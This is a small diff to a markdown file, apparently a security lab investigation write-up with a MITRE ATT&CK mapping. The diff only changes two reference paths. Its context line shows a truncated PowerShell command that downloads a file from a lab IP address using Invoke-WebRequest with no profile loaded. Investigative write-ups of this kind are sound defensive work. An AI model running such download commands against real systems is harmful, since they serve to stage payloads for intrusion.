@@ -49,5 +49,5 @@ powershell.exe -nop -c "Invoke-WebRequest http://192.168.56.102:8000/test.txt -O
 
 ## References
 
-* Investigation/investigation.md
-* MITRE-Mapping/mitre-mapping.md
+* Investigation.md
+* MITRE-Mapping.md
